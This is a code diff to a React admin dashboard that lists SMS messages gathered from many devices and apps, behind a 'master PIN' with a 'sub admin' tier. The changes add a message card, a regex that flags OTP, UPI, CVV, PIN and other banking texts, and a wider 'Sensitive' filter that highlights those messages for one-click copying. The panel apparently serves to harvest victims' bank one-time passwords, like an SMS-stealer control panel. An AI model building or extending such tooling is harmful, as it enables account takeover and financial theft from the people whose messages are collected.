@@ -440,6 +440,88 @@ function AppSelector({ apps, value, onChange, allLabel = "All Apps" }: { apps: A
   );
 }
 
+/* ── Message helpers (same logic as sub admin) ── */
+function isBankingMsg(body: string, sender: string): boolean {
+  const text = (body + " " + sender).toLowerCase();
+  return /\b(otp|upi|neft|rtgs|imps|bank|credit|debit|account|balance|transaction|txn|payment|transfer|rupee|inr|atm|cvv|pin|emi|loan|insurance|fraud|wallet|paytm|gpay|phonepe|bhim|recharge|cashback|refund|invoice|bill|due|mandate|auto.?pay|salary|withdraw|deposit)\b|₹/.test(text);
+}
+function isJunkSender(sender: string | null | undefined): boolean {
+  if (!sender) return true;
+  const s = sender.trim().toLowerCase();
+  return !s || s === "new sms" || s === "unknown" || s === "sms" || s.startsWith("sms from ");
+}
+function fmtShort(iso: string): string {
+  return new Date(iso).toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", hour12: false });
+}
+
+/* ── MsgCard — identical to sub admin's MsgCard design ── */
+function MsgCard({ msg, appColor }: { msg: MsgRow; appColor: string }) {
+  const displaySender = isJunkSender(msg.fromSender) ? msg.fromNumber : msg.fromSender;
+  const isBank = isBankingMsg(msg.body, msg.fromSender);
+  const [copiedBody, setCopiedBody] = useState(false);
+  const [copiedSender, setCopiedSender] = useState(false);
+
+  function copyVal(val: string, setCopied: (b: boolean) => void) {
+    copyToClipboard(val).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2000); });
+  }
+
+  return (
+    <div style={{
+      position: "relative", borderRadius: 8, overflow: "hidden",
+      border: `1px solid ${T.borderLight}`,
+      contentVisibility: "auto", containIntrinsicSize: "auto 140px",
+    } as React.CSSProperties}>
+      <div style={{ background: T.card, padding: "10px 14px", transition: "box-shadow 0.15s" }}
+        onMouseEnter={e => (e.currentTarget as HTMLDivElement).style.boxShadow = "0 2px 8px rgba(99,102,241,0.13)"}
+        onMouseLeave={e => (e.currentTarget as HTMLDivElement).style.boxShadow = "none"}
+      >
+        {/* Header: time on left | device + appId on right */}
+        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6, gap: 8 }}>
+          <span style={{ fontSize: 10, color: "#94a3b8" }}>{fmtShort(msg.receivedAt)}</span>
+          <div style={{ display: "flex", alignItems: "center", gap: 5 }}>
+            <span style={{ fontSize: 9, background: appColor + "22", color: appColor, border: `1px solid ${appColor}55`, borderRadius: 4, padding: "1px 6px", fontWeight: 800 }}>{msg.appId}</span>
+            <span style={{ fontSize: 10, background: T.headerBg, color: "#64748b", padding: "1px 7px", borderRadius: 4, fontFamily: "monospace" }}>{msg.deviceId.slice(0, 14)}</span>
+          </div>
+        </div>
+
+        {/* Body */}
+        <div style={{ display: "flex", alignItems: "flex-start", gap: 6, marginBottom: 6 }}>
+          <div style={{ flex: 1, fontSize: 13, color: isBank ? "#16a34a" : T.text, lineHeight: 1.55, wordBreak: "break-word" }}>{msg.body}</div>
+          <button onClick={e => { e.stopPropagation(); copyVal(msg.body, setCopiedBody); }} title="Copy message"
+            style={{ flexShrink: 0, background: "none", border: "none", cursor: "pointer", color: copiedBody ? T.green : T.accentLight, padding: 2, marginTop: 1, display: "flex" }}>
+            {copiedBody
+              ? <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+              : <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+            }
+          </button>
+        </div>
+
+        {/* From / To row */}
+        <div style={{ display: "flex", gap: 12, fontSize: 11, flexWrap: "wrap", alignItems: "center" }}>
+          <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
+            <span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>FROM</span>
+            {displaySender}
+            <button onClick={e => { e.stopPropagation(); copyVal(displaySender ?? "", setCopiedSender); }} title="Copy sender"
+              style={{ background: "none", border: "none", cursor: "pointer", color: copiedSender ? T.green : T.accentLight, padding: 1, display: "flex" }}>
+              {copiedSender
+                ? <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+                : <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+              }
+            </button>
+          </span>
+          {msg.fromSender && !isJunkSender(msg.fromSender) && msg.fromNumber !== msg.fromSender && (
+            <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
+              <span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>NUM</span>
+              {msg.fromNumber}
+            </span>
+          )}
+          {msg.isSensitive && <span style={{ fontSize: 9, fontWeight: 800, color: T.red, background: T.red + "18", borderRadius: 4, padding: "1px 5px" }}>SENSITIVE</span>}
+        </div>
+      </div>
+    </div>
+  );
+}
+
 /* ══════════════════════════════════════════
    MESSAGES TAB
 ══════════════════════════════════════════ */
@@ -457,7 +539,7 @@ function MessagesTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
     setLoading(true);
     setVisibleCount(30);
     try {
-      const qs = appFilter ? `?appId=${encodeURIComponent(appFilter)}&limit=0` : "?limit=0";
+      const qs = appFilter ? `?appId=${encodeURIComponent(appFilter)}&limit=5000` : "?limit=5000";
       const r = await apiFetch(`/api/messages${qs}`, { headers: { "x-master-pin": masterPin } });
       if (r.ok) {
         const data = await r.json() as MsgRow[];
@@ -470,7 +552,7 @@ function MessagesTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
 
   const filtered = useMemo(() => {
     let list = msgs;
-    if (sensitiveOnly) list = list.filter(m => m.isSensitive);
+    if (sensitiveOnly) list = list.filter(m => isBankingMsg(m.body, m.fromSender) || m.isSensitive);
     const q = search.trim().toLowerCase();
     if (q) list = list.filter(m =>
       m.fromNumber.includes(q) ||
@@ -483,17 +565,17 @@ function MessagesTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
     return list;
   }, [msgs, sensitiveOnly, search]);
 
-  useEffect(() => { setVisibleCount(30); }, [search, sensitiveOnly, appFilter]);
+  useEffect(() => { setVisibleCount(30); filteredLenRef.current = 0; }, [search, sensitiveOnly, appFilter]);
 
   useEffect(() => {
     const el = sentinelRef.current;
     if (!el) return;
     const obs = new IntersectionObserver(entries => {
-      if (entries[0].isIntersecting) setVisibleCount(c => Math.min(c + 30, filteredLenRef.current));
+      if (entries[0].isIntersecting) setVisibleCount(c => Math.min(c + 30, filteredLenRef.current || msgs.length));
     }, { rootMargin: "300px" });
     obs.observe(el);
     return () => obs.disconnect();
-  }, []);
+  }, [msgs.length]);
 
   const visible = useMemo(() => filtered.slice(0, visibleCount), [filtered, visibleCount]);
 
@@ -506,88 +588,51 @@ function MessagesTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
   }, [msgs]);
 
   return (
-    <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
-      {/* Toolbar */}
-      <div style={{ display: "flex", gap: 8, flexWrap: "wrap", alignItems: "center" }}>
+    <div style={{ padding: "10px 0", display: "flex", flexDirection: "column", gap: 10 }}>
+      {/* Toolbar — same layout as sub admin */}
+      <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
         <AppSelector apps={apps} value={appFilter} onChange={v => setAppFilter(v)} />
-        <div style={{ flex: 1, minWidth: 200, background: T.card, border: `1px solid ${T.borderLight}`, borderRadius: 9, display: "flex", alignItems: "center", padding: "8px 12px", gap: 8 }}>
-          <span style={{ color: T.muted, fontSize: 15 }}>⌕</span>
-          <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search message, sender, number, device, app…"
-            style={{ border: "none", outline: "none", flex: 1, fontSize: 13, background: "transparent", color: T.text }} />
-          {search && <button onClick={() => setSearch("")} style={{ background: "none", border: "none", cursor: "pointer", color: T.muted, fontSize: 16, padding: 0, lineHeight: 1 }}>✕</button>}
+        <div style={{ flex: 1, minWidth: 200, background: T.card, border: `1px solid ${T.borderLight}`, borderRadius: 8, display: "flex", alignItems: "center", padding: "8px 10px", gap: 6 }}>
+          <span style={{ color: T.muted, fontSize: 13 }}>⌕</span>
+          <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search messages…"
+            style={{ border: "none", outline: "none", flex: 1, fontSize: 12, background: "transparent", color: T.text }} />
+          {search && <button onClick={() => setSearch("")} style={{ background: "none", border: "none", cursor: "pointer", color: T.muted, fontSize: 14, padding: 0 }}>✕</button>}
         </div>
-        <button onClick={() => setSensitiveOnly(v => !v)} style={{ padding: "8px 14px", borderRadius: 9, border: `1.5px solid ${sensitiveOnly ? T.red : T.borderLight}`, background: sensitiveOnly ? T.red + "18" : T.card, color: sensitiveOnly ? T.red : T.muted, fontSize: 12, fontWeight: 700, cursor: "pointer", whiteSpace: "nowrap" }}>
-          {sensitiveOnly ? "🔴 Sensitive" : "Sensitive"}
-        </button>
-        <button onClick={() => void fetchMsgs()} disabled={loading} style={{ padding: "8px 14px", borderRadius: 9, border: `1px solid ${T.borderLight}`, background: T.card, color: T.mutedLight, fontSize: 12, fontWeight: 700, cursor: loading ? "wait" : "pointer", display: "flex", alignItems: "center", gap: 6 }}>
+        <button onClick={() => setSensitiveOnly(v => !v)} style={{
+          padding: "8px 12px", borderRadius: 8, border: "1.5px solid",
+          borderColor: sensitiveOnly ? T.red : T.borderLight,
+          background: sensitiveOnly ? T.red + "18" : T.card,
+          color: sensitiveOnly ? T.red : T.muted,
+          fontSize: 11, fontWeight: 600, cursor: "pointer",
+        }}>Sensitive</button>
+        <button onClick={() => void fetchMsgs()} disabled={loading} style={{ padding: "8px 12px", borderRadius: 8, border: `1px solid ${T.borderLight}`, background: T.card, color: T.mutedLight, fontSize: 11, fontWeight: 700, cursor: loading ? "wait" : "pointer", display: "flex", alignItems: "center", gap: 5 }}>
           {loading ? <Spinner /> : <Ic.Refresh />} Refresh
         </button>
       </div>
 
-      <div style={{ fontSize: 11, color: T.muted }}>
+      <div style={{ fontSize: 10, color: "#64748b" }}>
         {filtered.length !== msgs.length ? `${filtered.length} of ` : ""}{msgs.length} message{msgs.length !== 1 ? "s" : ""}
-        {visibleCount < filtered.length && <span style={{ color: T.accentLight }}> · showing {visibleCount}</span>}
+        {visibleCount < filtered.length && <span> · showing {visibleCount}</span>}
       </div>
 
       {loading && msgs.length === 0 ? (
-        <div style={{ textAlign: "center", padding: 60, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}>
-          <Spinner /><span>Loading all messages…</span>
+        <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", flexDirection: "column", gap: 8, padding: 40 }}>
+          <Spinner /><span style={{ fontSize: 13, color: "#94a3b8" }}>Loading messages…</span>
         </div>
       ) : filtered.length === 0 ? (
-        <div style={{ textAlign: "center", padding: 60, color: T.muted, background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}>
-          <Ic.Inbox /><span>{search || sensitiveOnly ? "No messages match filters." : "No messages yet."}</span>
+        <div style={{ textAlign: "center", color: "#94a3b8", padding: 32, fontSize: 13 }}>
+          {search || sensitiveOnly ? "No messages found" : "No messages yet"}
         </div>
       ) : (
         <>
-          <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
-            {visible.map(msg => {
-              const ac = appColors[msg.appId] ?? T.accent;
-              const isSens = msg.isSensitive;
-              const sender = msg.fromSender || msg.fromNumber;
-              return (
-                <div key={msg.id}
-                  style={{ background: T.card, borderRadius: 10, border: `1px solid ${isSens ? T.red + "44" : T.borderLight}`, overflow: "hidden" }}
-                  onMouseEnter={e => (e.currentTarget as HTMLDivElement).style.boxShadow = "0 2px 8px rgba(99,102,241,0.13)"}
-                  onMouseLeave={e => (e.currentTarget as HTMLDivElement).style.boxShadow = "none"}
-                >
-                  <div style={{ padding: "10px 14px" }}>
-                    {/* Header: time | app badge | device */}
-                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 7, gap: 8, flexWrap: "wrap" }}>
-                      <span style={{ fontSize: 10, color: T.muted }}>{fmtDate(msg.receivedAt)}</span>
-                      <div style={{ display: "flex", alignItems: "center", gap: 5 }}>
-                        <span style={{ fontSize: 9, background: ac + "22", color: ac, border: `1px solid ${ac}55`, borderRadius: 4, padding: "1px 6px", fontWeight: 800 }}>{msg.appId}</span>
-                        <span style={{ fontSize: 9, background: T.headerBg, color: T.mutedLight, padding: "1px 6px", borderRadius: 4, fontFamily: "monospace" }}>{msg.deviceId.slice(0, 14)}</span>
-                      </div>
-                    </div>
-                    {/* Body */}
-                    <div style={{ display: "flex", alignItems: "flex-start", gap: 10, marginBottom: 8 }}>
-                      <div style={{ flex: 1, fontSize: 13, color: isSens ? T.green : T.text, lineHeight: 1.6, wordBreak: "break-word" }}>{msg.body}</div>
-                      <CopyBtn value={msg.body} label="Copy" />
-                    </div>
-                    {/* From row */}
-                    <div style={{ display: "flex", gap: 10, fontSize: 11, flexWrap: "wrap", alignItems: "center" }}>
-                      <span style={{ display: "flex", alignItems: "center", gap: 5 }}>
-                        <span style={{ color: T.mutedLight, fontWeight: 700, fontSize: 10 }}>FROM</span>
-                        <span style={{ color: T.text }}>{sender}</span>
-                        {msg.fromSender && msg.fromNumber !== msg.fromSender && (
-                          <span style={{ color: T.accentLight, fontFamily: "monospace", fontSize: 11 }}>{msg.fromNumber}</span>
-                        )}
-                        <CopyBtn value={msg.fromNumber} label="Num" />
-                      </span>
-                      {isSens && <span style={{ fontSize: 9, fontWeight: 800, color: T.red, background: T.red + "18", borderRadius: 4, padding: "1px 5px" }}>SENSITIVE</span>}
-                      <span style={{ flex: 1 }} />
-                      <CopyBtn value={msg.deviceId} label="Dev ID" />
-                    </div>
-                  </div>
-                </div>
-              );
-            })}
+          <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
+            {visible.map(msg => (
+              <MsgCard key={msg.id} msg={msg} appColor={appColors[msg.appId] ?? T.accent} />
+            ))}
           </div>
           <div ref={sentinelRef} style={{ height: 1 }} />
           {visibleCount < filtered.length && (
-            <div style={{ textAlign: "center", padding: "12px 0", color: T.muted, fontSize: 12, display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
-              <Spinner /><span>Loading more…</span>
-            </div>
+            <div style={{ display: "flex", justifyContent: "center", padding: "10px 0" }}><Spinner /></div>
           )}
         </>
       )}
